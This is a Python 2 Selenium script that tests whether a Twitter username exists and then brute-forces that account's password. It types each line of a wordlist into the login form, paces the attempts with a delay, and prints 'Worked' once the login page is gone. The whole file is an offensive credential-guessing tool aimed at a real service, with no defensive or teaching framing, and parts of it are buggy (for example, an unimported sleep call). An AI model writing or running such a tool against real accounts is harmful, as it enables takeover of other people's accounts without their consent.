# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

import sys
reload(sys)
sys.setdefaultencoding('utf8')


def twitUserCheck(username):
    try:
        driver = webdriver.Firefox()
        driver.get("https://twitter.com/" + username)
        assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
        driver.close()
    except AssertionError:
        return 1

def twitterBruteforce(username, wordlist, delay):
    driver = webdriver.Firefox()
    driver.get("https://twitter.com/login")
    wait = WebDriverWait(driver, 10)
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            elem = driver.find_element_by_name("session[username_or_email]")
            elem.clear()
            elem.send_keys(username)
            elem = driver.find_element_by_name("session[password]")
            elem.clear()
            elem.send_keys(password)
            elem.send_keys(Keys.RETURN)
            sleep(delay)

            '''
                wait = WebDriverWait(driver, 10)
                user = wait.until(EC.visibility_of_element_located((By.NAME, "session[username_or_email]")))
                user.clear()
                user.send_keys(username)
                passcode = wait.until(EC.visibility_of_element_located((By.NAME, "session[password]")))
                passcode.clear()
                passcode.send_keys(password)
                '''
            assert "Login" in driver.title
        except AssertionError:
            print "Worked"
